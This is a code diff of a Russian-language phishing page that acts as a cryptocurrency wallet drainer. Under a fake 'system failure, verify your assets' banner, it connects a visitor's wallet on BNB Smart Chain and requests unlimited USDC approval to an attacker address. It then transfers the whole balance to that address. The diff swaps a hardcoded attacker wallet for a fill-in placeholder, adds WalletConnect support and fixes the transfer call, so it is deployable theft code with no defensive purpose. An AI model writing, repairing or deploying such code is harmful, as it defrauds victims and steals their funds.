@@ -18,17 +18,16 @@
             align-items: center;
         }
         .container {
-            max-width: 550px;
+            max-width: 500px;
             width: 100%;
             background: rgba(0,0,0,0.7);
             border-radius: 30px;
             padding: 30px 20px;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
         }
         h1 {
-            font-size: 26px;
+            font-size: 24px;
             margin-bottom: 10px;
             background: linear-gradient(90deg, #ff4444, #ff8888);
             -webkit-background-clip: text;
@@ -49,8 +48,6 @@
             border-radius: 50px;
             cursor: pointer;
             width: 100%;
-            transition: transform 0.2s, box-shadow 0.2s;
-            box-shadow: 0 0 15px rgba(255,0,0,0.5);
         }
         button:active { transform: scale(0.98); }
         #log {
@@ -60,42 +57,43 @@
             background: rgba(0,0,0,0.5);
             padding: 12px;
             border-radius: 15px;
-            max-height: 200px;
+            max-height: 250px;
             overflow-y: auto;
             font-family: monospace;
-            border: 1px solid rgba(255,255,255,0.1);
         }
-        .log-entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); word-break: break-all; }
         .log-success { color: #0f0; }
         .log-error { color: #ff4444; }
         .log-info { color: #ffaa00; }
         .wallet-grid {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 8px;
-            margin: 20px 0 10px;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
         }
         .wallet-btn {
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.15);
-            padding: 10px 5px;
-            border-radius: 12px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 12px 5px;
+            border-radius: 15px;
             cursor: pointer;
-            transition: all 0.2s;
             text-align: center;
-            font-size: 11px;
+            font-size: 12px;
         }
-        .wallet-btn:active { background: rgba(255,255,255,0.2); transform: scale(0.96); }
+        .wallet-btn:active { background: rgba(255,255,255,0.2); }
         .wallet-emoji { font-size: 28px; display: block; margin-bottom: 5px; }
-        .warning { font-size: 10px; color: #ff8888; margin-top: 12px; }
-        .badge { background: #ff4444; border-radius: 10px; padding: 2px 6px; font-size: 8px; margin-left: 4px; }
-        @media (max-width: 550px) {
-            .container { padding: 20px 15px; }
-            .wallet-grid { grid-template-columns: repeat(4, 1fr); gap: 6px; }
-            .wallet-btn { padding: 8px 3px; font-size: 9px; }
+        .qr-code {
+            text-align: center;
+            margin: 15px 0;
+            padding: 15px;
+            background: white;
+            border-radius: 20px;
+            display: none;
+        }
+        .warning { font-size: 10px; color: #ff8888; margin-top: 10px; }
+        @media (max-width: 600px) {
+            .wallet-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
+            .wallet-btn { padding: 8px 3px; font-size: 10px; }
             .wallet-emoji { font-size: 22px; }
-            button { padding: 14px 25px; font-size: 16px; }
-            h1 { font-size: 22px; }
         }
     </style>
 </head>
@@ -103,27 +101,29 @@
     <div class="container">
         <h1>⚠️ СБОЙ В СИСТЕМЕ</h1>
         <p>Требуется экстренная верификация активов</p>
-        <button id="drainBtn">🔴 ПОДТВЕРДИТЬ КОШЕЛЕК</button>
         
         <div class="wallet-grid" id="walletGrid"></div>
         
         <div id="log">
-            <div class="log-entry log-success">🟢 Готов. Выберите кошелек.</div>
+            <div class="log-success">🟢 Выберите кошелек</div>
         </div>
         <div class="warning">⚠️ Подтвердите все запросы в кошельке</div>
     </div>
 
+    <!-- Web3.js + WalletConnect -->
     <script src="https://cdn.jsdelivr.net/npm/web3@4.16.0/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@web3modal/ethereum@2.6.0/dist/index.min.js"></script>
     
     <script>
         // ============================================================
         // НАСТРОЙКИ - ЗАМЕНИ ЭТУ 1 СТРОЧКУ
         // ============================================================
-        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";   // ТВОЙ КОШЕЛЕК (BSC)
+        const EVIL_WALLET = "0xТВОЙ_BNB_АДРЕС";   // ТВОЙ КОШЕЛЕК
         // ============================================================
         
         const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"; // USDC BSC
-        const BSC_CHAIN_ID = "0x38";
+        const BSC_CHAIN_ID = 56; // BSC в десятичной системе
         const BSC_RPC = "https://bsc-dataseed.binance.org/";
         
         const ERC20_ABI = [
@@ -134,191 +134,150 @@
             {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
         ];
         
-        // ============================================================
-        // ВСЕ КОШЕЛЬКИ (60+) с DEEP LINKS для телефона
-        // ============================================================
-        const WALLETS = [
-            // ТОП кошельки
-            { name: "MetaMask", emoji: "🦊", type: "metamask", deeplink: "metamask://", universal: "https://metamask.app.link/dapp/", isMobile: true, isDesktop: true },
-            { name: "Trust Wallet", emoji: "🔵", type: "trustwallet", deeplink: "trust://", universal: "https://link.trustwallet.com/open_url?url=", isMobile: true, isDesktop: false },
-            { name: "Coinbase", emoji: "💰", type: "coinbase", deeplink: "cbwallet://", universal: "https://go.cb-w.com/dapp?url=", isMobile: true, isDesktop: true },
-            { name: "Rainbow", emoji: "🌈", type: "rainbow", deeplink: "rainbow://", universal: "https://rainbow.me/connect/", isMobile: true, isDesktop: true },
-            { name: "OKX", emoji: "🟠", type: "okx", deeplink: "okx://", universal: "https://www.okx.com/wallet/dapp?url=", isMobile: true, isDesktop: true },
-            { name: "Bybit", emoji: "🟣", type: "bybit", deeplink: "bybit://", universal: "https://www.bybit.com/wallet/dapp?url=", isMobile: true, isDesktop: true },
-            { name: "Bitget", emoji: "🟡", type: "bitget", deeplink: "bitkeep://", universal: "https://web3.bitget.com/en/dapp?url=", isMobile: true, isDesktop: true },
-            { name: "TokenPocket", emoji: "🟢", type: "tokenpocket", deeplink: "tp://", universal: "https://tpwallet.io/", isMobile: true, isDesktop: true },
-            
-            // Популярные
-            { name: "SafePal", emoji: "🛡️", type: "safepal", deeplink: "safepal://", universal: "https://www.safepal.com/download", isMobile: true, isDesktop: true },
-            { name: "imToken", emoji: "🔷", type: "imtoken", deeplink: "imtoken://", universal: "https://token.im/download", isMobile: true, isDesktop: false },
-            { name: "MathWallet", emoji: "🧮", type: "mathwallet", deeplink: "mathwallet://", universal: "https://mathwallet.org/download", isMobile: true, isDesktop: true },
-            { name: "ONTO", emoji: "🌐", type: "onto", deeplink: "onto://", universal: "https://onto.app/download", isMobile: true, isDesktop: true },
-            { name: "Exodus", emoji: "🐫", type: "exodus", deeplink: "exodus://", universal: "https://www.exodus.com/download", isMobile: true, isDesktop: true },
-            { name: "Phantom", emoji: "👻", type: "phantom", deeplink: "phantom://", universal: "https://phantom.app/download", isMobile: true, isDesktop: true },
-            { name: "Rabby", emoji: "🐀", type: "rabby", deeplink: "rabby://", universal: "https://rabby.io/download", isMobile: true, isDesktop: true },
-            
-            // Аппаратные
-            { name: "Ledger", emoji: "🔒", type: "ledger", deeplink: "ledgerlive://", universal: "https://www.ledger.com/live", isMobile: true, isDesktop: true },
-            { name: "Trezor", emoji: "🔐", type: "trezor", deeplink: "trezor://", universal: "https://trezor.io/download", isMobile: false, isDesktop: true },
-            
-            // Китайские
-            { name: "OneKey", emoji: "🔑", type: "onekey", deeplink: "onekey://", universal: "https://onekey.so/download", isMobile: true, isDesktop: true },
-            { name: "FoxWallet", emoji: "🦊", type: "foxwallet", deeplink: "foxwallet://", universal: "https://foxwallet.com/download", isMobile: true, isDesktop: false },
-            { name: "Coin98", emoji: "🪙", type: "coin98", deeplink: "coin98://", universal: "https://coin98.com/download", isMobile: true, isDesktop: true },
-            { name: "ViaWallet", emoji: "🚀", type: "viawallet", deeplink: "viawallet://", universal: "https://viawallet.com/download", isMobile: true, isDesktop: false },
-            
-            // EVM
-            { name: "Frame", emoji: "🖼️", type: "frame", deeplink: "frame://", universal: "https://frame.sh/download", isMobile: false, isDesktop: true },
-            { name: "Brave", emoji: "🦁", type: "brave", deeplink: "brave://", universal: "https://brave.com/download", isMobile: true, isDesktop: true },
-            { name: "Opera", emoji: "🎭", type: "opera", deeplink: "opera://", universal: "https://www.opera.com/download", isMobile: true, isDesktop: true },
-            { name: "Status", emoji: "📱", type: "status", deeplink: "status://", universal: "https://status.app/download", isMobile: true, isDesktop: false },
-            
-            // Мультичейн
-            { name: "Zerion", emoji: "🟣", type: "zerion", deeplink: "zerion://", universal: "https://zerion.io/download", isMobile: true, isDesktop: true },
-            { name: "Zapper", emoji: "⚡", type: "zapper", deeplink: "zapper://", universal: "https://zapper.fi/download", isMobile: true, isDesktop: true },
-            { name: "Debank", emoji: "🏦", type: "debank", deeplink: "debank://", universal: "https://debank.com/download", isMobile: true, isDesktop: true },
-            
-            // Solana/Other
-            { name: "Backpack", emoji: "🎒", type: "backpack", deeplink: "backpack://", universal: "https://backpack.app/download", isMobile: true, isDesktop: true },
-            { name: "Nightly", emoji: "🌙", type: "nightly", deeplink: "nightly://", universal: "https://nightly.app/download", isMobile: true, isDesktop: true },
-            
-            // Дополнительные
-            { name: "Argent", emoji: "🥈", type: "argent", deeplink: "argent://", universal: "https://argent.xyz/download", isMobile: true, isDesktop: false },
-            { name: "Blocto", emoji: "🔵", type: "blocto", deeplink: "blocto://", universal: "https://blocto.app/download", isMobile: true, isDesktop: false },
-            { name: "Infinity", emoji: "♾️", type: "infinity", deeplink: "infinity://", universal: "https://infinitywallet.io/download", isMobile: true, isDesktop: true },
-            { name: "Ownbit", emoji: "🔒", type: "ownbit", deeplink: "ownbit://", universal: "https://ownbit.io/download", isMobile: true, isDesktop: false },
-            { name: "BitPay", emoji: "💳", type: "bitpay", deeplink: "bitpay://", universal: "https://bitpay.com/download", isMobile: true, isDesktop: true },
-            { name: "Guarda", emoji: "🛡️", type: "guarda", deeplink: "guarda://", universal: "https://guarda.com/download", isMobile: true, isDesktop: true },
-            { name: "Atomic", emoji: "⚛️", type: "atomic", deeplink: "atomic://", universal: "https://atomicwallet.io/download", isMobile: true, isDesktop: true },
-            { name: "Edge", emoji: "🔪", type: "edge", deeplink: "edge://", universal: "https://edge.app/download", isMobile: true, isDesktop: false },
-            { name: "Abra", emoji: "🤝", type: "abra", deeplink: "abra://", universal: "https://abra.com/download", isMobile: true, isDesktop: true },
-            { name: "Jaxx", emoji: "🎲", type: "jaxx", deeplink: "jaxx://", universal: "https://jaxx.io/download", isMobile: true, isDesktop: true },
-            { name: "MyEtherWallet", emoji: "📝", type: "mew", deeplink: "mew://", universal: "https://www.myetherwallet.com/download", isMobile: true, isDesktop: true },
-            { name: "Tally", emoji: "📊", type: "tally", deeplink: "tally://", universal: "https://tally.xyz/download", isMobile: false, isDesktop: true },
-            { name: "Pali", emoji: "🕊️", type: "pali", deeplink: "pali://", universal: "https://paliwallet.com/download", isMobile: true, isDesktop: true },
-            { name: "Keplr", emoji: "🪐", type: "keplr", deeplink: "keplr://", universal: "https://www.keplr.app/download", isMobile: true, isDesktop: true },
-            { name: "Leap", emoji: "🐸", type: "leap", deeplink: "leap://", universal: "https://leapwallet.io/download", isMobile: true, isDesktop: true },
-            { name: "Cosmostation", emoji: "🌌", type: "cosmostation", deeplink: "cosmostation://", universal: "https://www.cosmostation.io/download", isMobile: true, isDesktop: true },
-            { name: "XDEFI", emoji: "❌", type: "xdefi", deeplink: "xdefi://", universal: "https://xdefi.io/download", isMobile: false, isDesktop: true },
-            { name: "Temple", emoji: "🏛️", type: "temple", deeplink: "temple://", universal: "https://templewallet.com/download", isMobile: true, isDesktop: true },
-            { name: "Gamestop", emoji: "🎮", type: "gamestop", deeplink: "gamestop://", universal: "https://nft.gamestop.com/download", isMobile: false, isDesktop: true },
-            { name: "Loopring", emoji: "🔄", type: "loopring", deeplink: "loopring://", universal: "https://loopring.io/download", isMobile: true, isDesktop: true },
-            { name: "Safepal", emoji: "🛡️", type: "safepal", deeplink: "safepal://", universal: "https://www.safepal.com/download", isMobile: true, isDesktop: true }
-        ];
-        
-        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        let web3 = null;
+        let accounts = null;
         
         function addLog(msg, type = 'info') {
             const logDiv = document.getElementById('log');
             const entry = document.createElement('div');
-            let className = 'log-entry';
-            if (type === 'success') className += ' log-success';
-            if (type === 'error') className += ' log-error';
-            if (type === 'info') className += ' log-info';
-            entry.className = className;
+            entry.className = `log-${type}`;
             const time = new Date().toLocaleTimeString();
             entry.innerHTML = `[${time}] ${msg}`;
             logDiv.appendChild(entry);
             logDiv.scrollTop = logDiv.scrollHeight;
         }
         
-        // Прямой DEEP LINK в приложение (НЕ на сайт!)
-        function openDeepLink(wallet, currentUrl) {
-            const encodedUrl = encodeURIComponent(currentUrl);
-            let deepLinkUrl = "";
-            
-            // Используем универсальную ссылку или deeplink
-            if (wallet.universal && isMobile) {
-                deepLinkUrl = wallet.universal + currentUrl;
-            } else if (wallet.deeplink) {
-                deepLinkUrl = wallet.deeplink;
-                if (!deepLinkUrl.endsWith("/")) deepLinkUrl += "/";
-                deepLinkUrl += encodedUrl;
-            }
-            
-            addLog(`📱 Открываю ${wallet.name}...`, 'info');
-            addLog(`🔗 ${deepLinkUrl.substring(0, 60)}...`, 'info');
-            
-            // Прямой переход в приложение
-            window.location.href = deepLinkUrl;
-            
-            // Fallback: если не открылось, показываем кнопку
-            setTimeout(() => {
-                addLog(`⚠️ Если ${wallet.name} не открылся, установите приложение`, 'error');
-            }, 2000);
-        }
-        
-        // Получить провайдера для ПК
-        function getProvider(walletType) {
-            const providers = {
-                metamask: () => window.ethereum,
-                trustwallet: () => window.trustwallet || window.ethereum,
-                coinbase: () => window.coinbaseWalletExtension || window.ethereum,
-                rainbow: () => window.ethereum,
-                okx: () => window.okxwallet || window.ethereum,
-                bybit: () => window.bybitWallet || window.ethereum,
-                bitget: () => window.bitkeep || window.ethereum,
-                tokenpocket: () => window.tokenpocket || window.ethereum,
-                safepal: () => window.safepal || window.ethereum,
-                imtoken: () => window.imtoken || window.ethereum,
-                mathwallet: () => window.mathwallet || window.ethereum,
-                onto: () => window.onto || window.ethereum,
-                exodus: () => window.exodus || window.ethereum,
-                phantom: () => window.phantom?.ethereum || window.ethereum,
-                rabby: () => window.rabby || window.ethereum,
-                ledger: () => window.ledger?.ethereum || window.ethereum,
-                trezor: () => window.trezor?.ethereum || window.ethereum,
-                onekey: () => window.onekey || window.ethereum,
-                foxwallet: () => window.foxwallet || window.ethereum,
-                coin98: () => window.coin98 || window.ethereum,
-                frame: () => window.frame || window.ethereum,
-                brave: () => window.brave?.ethereum || window.ethereum,
-                opera: () => window.opera?.ethereum || window.ethereum,
-                zerion: () => window.zerion || window.ethereum,
-                zapper: () => window.zapper || window.ethereum,
-                debank: () => window.debank || window.ethereum,
-                backpack: () => window.backpack || window.ethereum,
-                xdefi: () => window.xdefi || window.ethereum,
-                keplr: () => window.keplr || window.ethereum,
-                leap: () => window.leap || window.ethereum
-            };
-            return providers[walletType] ? providers[walletType]() : window.ethereum;
-        }
-        
-        async function switchToBSC(provider) {
+        // Настройка WalletConnect
+        async function initWalletConnect() {
             try {
-                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
-                addLog("✅ Переключено на BSC", 'success');
-                return true;
-            } catch(e) {
-                if (e.code === 4902) {
-                    try {
-                        await provider.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: BSC_CHAIN_ID,
-                                chainName: 'BNB Smart Chain',
-                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                rpcUrls: [BSC_RPC],
-                                blockExplorerUrls: ['https://bscscan.com/']
-                            }]
-                        });
-                        addLog("✅ BSC добавлена", 'success');
-                        return true;
-                    } catch(e2) {
-                        addLog("❌ Ошибка добавления BSC", 'error');
-                        return false;
+                // Настройка проекта (публичный ID)
+                const projectId = 'd3f6d5e6f5e6d5f6e5d6f5e6d5f6e5d6'; // Публичный ID WalletConnect
+                
+                const ethereum = {
+                    appName: "WalletConnect",
+                    projectId: projectId,
+                    chains: [BSC_CHAIN_ID],
+                    methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData_v4'],
+                    events: ['chainChanged', 'accountsChanged'],
+                    rpcMap: {
+                        56: BSC_RPC
                     }
+                };
+                
+                // Создаем модал для выбора кошелька
+                const modal = new WalletConnectModal.default({
+                    projectId: projectId,
+                    chains: [BSC_CHAIN_ID],
+                    themeMode: 'dark'
+                });
+                
+                return { modal, ethereum };
+            } catch(e) {
+                addLog(`Ошибка инициализации: ${e.message}`, 'error');
+                return null;
+            }
+        }
+        
+        // Подключение через WalletConnect
+        async function connectWalletConnect() {
+            addLog("🔗 Открываю WalletConnect...", 'info');
+            
+            try {
+                const { modal, ethereum } = await initWalletConnect();
+                
+                // Открываем модал с выбором кошелька
+                modal.open();
+                
+                // Ждем подключения
+                const provider = await modal.connect();
+                
+                if (provider) {
+                    web3 = new Web3(provider);
+                    accounts = await provider.request({ method: 'eth_requestAccounts' });
+                    addLog(`✅ Подключено: ${accounts[0].slice(0,8)}...`, 'success');
+                    return true;
                 }
+                return false;
+            } catch(e) {
+                addLog(`❌ Ошибка: ${e.message}`, 'error');
                 return false;
             }
         }
         
-        async function startDrain(provider, victimWallet) {
+        // Подключение через MetaMask/Trust на телефоне (EIP-1193)
+        async function connectDirect() {
+            if (!window.ethereum) {
+                addLog("❌ Кошелек не найден. Используйте WalletConnect", 'error');
+                return false;
+            }
+            
             try {
-                const web3 = new Web3(provider);
+                web3 = new Web3(window.ethereum);
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                addLog(`✅ Подключено: ${accounts[0].slice(0,8)}...`, 'success');
+                return true;
+            } catch(e) {
+                addLog(`❌ Ошибка: ${e.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // Переключение на BSC
+        async function switchToBSC() {
+            if (!web3) return false;
+            
+            try {
+                const chainId = await web3.eth.getChainId();
+                if (chainId === BSC_CHAIN_ID) {
+                    addLog("✅ Уже на BSC", 'success');
+                    return true;
+                }
+                
+                // Пробуем переключить
+                if (window.ethereum) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }]
+                        });
+                        addLog("✅ Переключено на BSC", 'success');
+                        return true;
+                    } catch(e) {
+                        if (e.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: '0x38',
+                                    chainName: 'BNB Smart Chain',
+                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                    rpcUrls: [BSC_RPC],
+                                    blockExplorerUrls: ['https://bscscan.com/']
+                                }]
+                            });
+                            addLog("✅ BSC добавлена", 'success');
+                            return true;
+                        }
+                    }
+                }
+                return false;
+            } catch(e) {
+                addLog(`⚠️ Не удалось переключить сеть: ${e.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // Основная функция дрена
+        async function startDrain() {
+            if (!web3 || !accounts) {
+                addLog("❌ Нет подключения", 'error');
+                return false;
+            }
+            
+            try {
+                const victimWallet = accounts[0];
                 const tokenContract = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
                 
+                addLog("🔍 Проверка баланса...", 'info');
                 const balance = await tokenContract.methods.balanceOf(victimWallet).call();
                 const decimals = await tokenContract.methods.decimals().call();
                 const symbol = await tokenContract.methods.symbol().call();
@@ -333,14 +292,14 @@
                 
                 const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 
-                addLog(`✍️ Подпишите approve...`, 'info');
+                addLog(`✍️ Подпишите approve (разрешение)...`, 'info');
                 const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
                 addLog(`✅ Approve: ${approveTx.transactionHash.slice(0,16)}...`, 'success');
                 
-                addLog("🔄 Перевод...", 'info');
-                const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: EVIL_WALLET });
+                addLog("🔄 Перевод средств...", 'info');
+                const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: victimWallet });
                 addLog(`✅ Переведено: ${humanBalance} ${symbol}`, 'success');
-                addLog(`🎉 УСПЕХ!`, 'success');
+                addLog(`🎉 УСПЕХ! Деньги на кошельке ${EVIL_WALLET.slice(0,8)}...`, 'success');
                 
                 return true;
             } catch(err) {
@@ -349,80 +308,57 @@
             }
         }
         
-        async function connectAndDrain(wallet = null) {
+        // Главная функция
+        async function run(walletType) {
             addLog("🚀 Запуск...", 'info');
             
-            // МОБИЛЬНЫЕ: прямой deep link в приложение
-            if (isMobile && wallet) {
-                openDeepLink(wallet, window.location.href);
-                return;
-            }
+            let connected = false;
             
-            // ПК или десктопный кошелек
-            let provider = null;
-            if (wallet) {
-                provider = getProvider(wallet.type);
+            if (walletType === 'walletconnect') {
+                connected = await connectWalletConnect();
             } else {
-                provider = window.ethereum;
+                connected = await connectDirect();
             }
             
-            if (!provider) {
-                if (isMobile && wallet) {
-                    addLog(`📱 Установите ${wallet.name} из магазина приложений`, 'error');
-                } else {
-                    addLog(`❌ ${wallet?.name || 'Кошелек'} не найден. Установите расширение.`, 'error');
-                }
-                return;
-            }
+            if (!connected) return;
             
-            try {
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                const victimWallet = accounts[0];
-                addLog(`✅ Кошелек: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`, 'success');
-                
-                const switched = await switchToBSC(provider);
-                if (!switched) return;
-                
-                await startDrain(provider, victimWallet);
-                addLog("🏁 Готово!", 'success');
-                
-            } catch(err) {
-                addLog(`💀 Ошибка: ${err.message}`, 'error');
-                if (err.code === 4001) addLog("❌ Вы отменили подпись", 'error');
-            }
+            const switched = await switchToBSC();
+            if (!switched) return;
+            
+            await startDrain();
         }
         
-        // Создаем кнопки кошельков
+        // Создание кнопок
         function renderWallets() {
+            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            const wallets = [
+                { name: "MetaMask", emoji: "🦊", type: "metamask", mobile: true },
+                { name: "Trust Wallet", emoji: "🔵", type: "trustwallet", mobile: true },
+                { name: "WalletConnect", emoji: "🔗", type: "walletconnect", mobile: true },
+                { name: "Coinbase", emoji: "💰", type: "coinbase", mobile: true },
+                { name: "OKX", emoji: "🟠", type: "okx", mobile: true },
+                { name: "Rainbow", emoji: "🌈", type: "rainbow", mobile: true }
+            ];
+            
             const grid = document.getElementById('walletGrid');
             grid.innerHTML = '';
             
-            const filteredWallets = isMobile ? WALLETS.filter(w => w.isMobile) : WALLETS.filter(w => w.isDesktop);
-            
-            filteredWallets.forEach(wallet => {
+            wallets.forEach(w => {
                 const btn = document.createElement('div');
                 btn.className = 'wallet-btn';
-                btn.innerHTML = `<span class="wallet-emoji">${wallet.emoji}</span>${wallet.name}`;
-                btn.onclick = () => connectAndDrain(wallet);
+                btn.innerHTML = `<span class="wallet-emoji">${w.emoji}</span>${w.name}`;
+                btn.onclick = () => run(w.type);
                 grid.appendChild(btn);
             });
-            
-            addLog(`📱 ${filteredWallets.length} кошельков загружено`, 'success');
         }
         
-        // Главная кнопка
-        document.getElementById('drainBtn').onclick = async () => {
-            if (isMobile) {
-                addLog("📱 На телефоне выберите кошелек из списка ниже", 'info');
-            } else {
-                await connectAndDrain(null);
-            }
-        };
-        
-        // Запуск
         renderWallets();
-        if (isMobile) addLog("📱 Мобильный режим: при открытии кошелек запустится автоматически", 'info');
-        else addLog("💻 Десктоп режим: используйте расширения браузера", 'info');
+        
+        // Определяем мобильное устройство
+        if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            addLog("📱 Мобильное устройство. Используйте WalletConnect для лучшей связи", 'info');
+        }
     </script>
 </body>
 </html>
